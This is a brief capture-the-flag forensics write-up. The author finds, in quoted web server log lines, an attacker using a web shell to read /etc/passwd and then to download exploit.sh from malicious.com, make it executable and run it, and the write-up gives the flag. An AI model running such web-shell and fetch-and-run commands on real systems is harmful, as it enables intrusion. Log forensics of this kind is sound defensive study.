```
 Christmas Toys Heist #3
100

What is the name of the file used by the attacker to gain access to the server?

Flag format: CMCTF{filename}

Author: t4f3

```
on website.log file we found those line:
```
192.168.1.100 - - [20/Dec/2024:00:01:42 +0100] "POST /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2345
192.168.1.100 - - [20/Dec/2024:00:01:44 +0100] "POST /uploads/shell.php?cmd=wget+http://malicious.com/exploit.sh HTTP/1.1" 200 345
192.168.1.100 - - [20/Dec/2024:00:01:46 +0100] "POST /uploads/shell.php?cmd=chmod+%2Bx+exploit.sh HTTP/1.1" 200 123
192.168.1.100 - - [20/Dec/2024:00:01:48 +0100] "POST /uploads/shell.php?cmd=./exploit.sh HTTP/1.1" 200 456
```
that suggest the attacker, through the webshell, download exploit.sh on the server and run it to gain access to the server

# flag : CMCTF{exploit.sh}
